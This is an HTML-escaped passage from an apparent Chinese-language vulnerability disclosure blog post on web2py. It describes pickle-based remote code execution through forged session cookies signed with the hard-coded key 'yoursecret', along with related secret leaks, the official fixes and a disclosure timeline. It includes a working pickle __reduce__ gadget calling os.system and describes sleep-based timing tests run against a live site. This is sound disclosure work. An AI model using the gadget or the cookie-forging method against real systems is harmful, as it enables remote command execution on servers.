&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cPickle&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;   &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__reduce__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Malicious&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;cposix&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;(S&apos;echo success&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;p2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;tp3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Rp4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;.&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cPickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;serialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;這就是 Pickle 誤用反序列化所造成的命令執行風險。攻擊者很容易可以產生一個含有任意命令執行的序列化字串，進而讓受害者在進行反序列化的過程中觸發執行惡意命令。&lt;/p&gt;

&lt;h3 id=&quot;反序列化--序列化字串可控&quot;&gt;反序列化 ＋ 序列化字串可控&lt;/h3&gt;

&lt;p&gt;本次發現的問題主要來自 web2py 本身的 session cookie 使用 Pickle 處理序列化需求 (CVE-2016-3957)，而且因為 session cookie 的加密字串固定 (CVE-2016-3953)，攻擊者可任意偽造惡意的序列化字串造成前面所介紹的命令執行風險。細節如下。&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3957&quot;&gt;CVE-2016-3957&lt;sup id=&quot;fnref:note1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/h4&gt;

&lt;p&gt;web2py 的應用程式如果使用 cookie 來儲存 session 資訊，那麼在每次接到使用者請求時會將 session cookie 用一個 secure_loads 函式將 cookie 內容讀入。 [&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/globals.py#L846&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/globals.py#L846&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_storage_type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;cookie&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;# check if there is session data in cookies
&lt;/span&gt;            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_data_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_cookie_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                                    &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;secure_loads 函式內容如下，在一連串解密後會用 pickle.loads 方法將解密內容反序列化，在這裡確定 cookie 內容會使用 Pickle 處理。[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/gluon/utils.py#L200&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;gluon/utils.py#L200&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;secure_loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;:&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sha1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hash_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compare&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;actual_signature&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encryption_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urlsafe_b64decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES_new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IV&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encrypted_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compression_level&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decompress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pickle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# &amp;lt;-- Bingo!!!
&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Exception&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;因此，如果知道連線中用以加密 cookie 內容的 encryption_key，攻擊者就可以偽造 session cookie，進而利用 pickle.loads 進行遠端命令執行。&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3953&quot;&gt;CVE-2016-3953&lt;/h4&gt;

&lt;p&gt;很幸運的，我們發現 web2py 預設開啟的範例應用程式是使用 session cookie，並且有一個寫死的密鑰：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;。[&lt;a href=&quot;https://github.com/web2py/web2py/blob/R-2.14.1/applications/examples/models/session.py&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;yoursecret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;因此，web2py 的使用者如果沒有手動關閉範例應用程式，攻擊者就可以直接在 http://[target]/examples/ 頁面發動攻擊取得主機操作權。&lt;/p&gt;

&lt;h4 id=&quot;proof-of-concept&quot;&gt;Proof of Concept&lt;/h4&gt;

&lt;p&gt;我們嘗試用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt; 作為 encryption_key 偽造一個合法的 session cookie，並將一個會執行系統指令 sleep 的物件塞入其中。帶著此 session cookie 連入 web2py 官網範例應用程式(http://www.web2py.com/examples)，情形如下：&lt;/p&gt;

&lt;p&gt;當插入的物件會執行指令 sleep 3 時，網站回應時間為 6.8 秒&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC1.png&quot; alt=&quot;POC1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;當插入的物件會執行指令 sleep 5 時，網站回應時間為 10.8 秒&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/POC2.png&quot; alt=&quot;POC2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;確實會因為塞入的 session cookie 值不同而有所延遲，證明網站的確執行了（兩次）我們偽造的物件內容。&lt;sup id=&quot;fnref:note2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;

&lt;h3 id=&quot;其他洩漏導致-rce&quot;&gt;其他洩漏導致 RCE&lt;/h3&gt;

&lt;p&gt;此外，在 web2py 範例應用程式為了示範框架的特性，因此洩漏了許多環境變數。其中有兩個變數較為敏感，間接也會導致端命令執行，分別如下。&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3954&quot;&gt;CVE-2016-3954&lt;/h4&gt;

&lt;p&gt;在 http://[target]/examples/simple_examples/status 頁面中，response 分頁內容洩漏了 session_cookie_key 值。這個值就是用來加密前面所介紹的 session cookie，搭配 CVE-2016-3957 Pickle 的問題可直接遠端命令執行。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3954.png&quot; alt=&quot;CVE-2016-3954&quot; /&gt;&lt;/p&gt;

&lt;p&gt;無論使用者是否自行更改 session_cookie_key，或是該值是系統隨機產生。此介面仍然可以取得機敏資訊藉以造成危害。&lt;/p&gt;

&lt;h4 id=&quot;cve-2016-3952&quot;&gt;CVE-2016-3952&lt;/h4&gt;

&lt;p&gt;http://[target]/examples/template_examples/beautify 頁面洩漏了系統環境變數，當使用者是使用 standalone 版本時，管理者的密碼就會在環境變數裡出現。這個密碼可登入 http://[target]/admin 管理介面，管理介面內提供方便的功能得以執行任意指令。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20170103/CVE-2016-3952.png&quot; alt=&quot;CVE-2016-3952&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;官方修復&quot;&gt;官方修復&lt;/h3&gt;

&lt;p&gt;Version 2.14.1 移除洩漏的環境變數。[&lt;a href=&quot;https://github.com/web2py/web2py/commit/9706d125b42481178d2b423de245f5d2faadbf40&quot;&gt;Ref&lt;/a&gt;]&lt;/p&gt;

&lt;p&gt;Version 2.14.2 使用不固定字串作為 session_cookie_key，並移除洩漏頁面。&lt;/p&gt;

&lt;div class=&quot;highlight-name&quot;&gt;applications/examples/models/session.py&lt;/div&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-py&quot; data-lang=&quot;py&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;gluon.utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cache&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ram&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;cookie_key&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web2py_uuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;總結&quot;&gt;總結&lt;/h3&gt;

&lt;p&gt;web2py 框架預設會開啟一個範例應用程式，路徑為 http://[target]/examples/。&lt;br /&gt;
由於這個應用程式使用 Pickle 來處理序列化的 session cookie，且因為加密字串為寫死的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yoursecret&lt;/code&gt;，任何人可竄改 session cookie 的內容，藉此進行 Pickle 命令執行攻擊。&lt;br /&gt;
該範例程式介面中也存在 session_cookie_key、管理者密碼洩漏問題，兩個都會導致任意命令執行。除此之外，在這個應用程式中洩漏許多系統配置、路徑等資訊，有機會被拿來做進階攻擊。&lt;br /&gt;
在 2.14.2 版本後已經修復所有洩漏問題，當然最好的解決辦法就是關閉這個範例應用程式。&lt;/p&gt;

&lt;p&gt;最後，來整理從開發者的角度在這個案例中該注意的要點：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;小心處理序列化字串，使用者若有機會改變該字串值，有機會被插入未預期的惡意物件，造成惡意的結果。&lt;/li&gt;
  &lt;li&gt;正式產品中切記要移除任何跟開發相關的配置。&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;時間軸&quot;&gt;時間軸&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;2016/03/08 發現問題與其他研究&lt;/li&gt;
  &lt;li&gt;2016/03/09 回報官方 &lt;a href=&quot;https://github.com/web2py/web2py/issues/1205&quot;&gt;GitHub Issue&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;2016/03/15 成功與開發者 email 聯繫&lt;/li&gt;
  &lt;li&gt;2016/03/15 官方修復管理者密碼洩漏問題 (CVE-2016-3952)&lt;/li&gt;
  &lt;li&gt;2016/03/25 官方修復其他弱點並發佈 2.14.2 版本&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
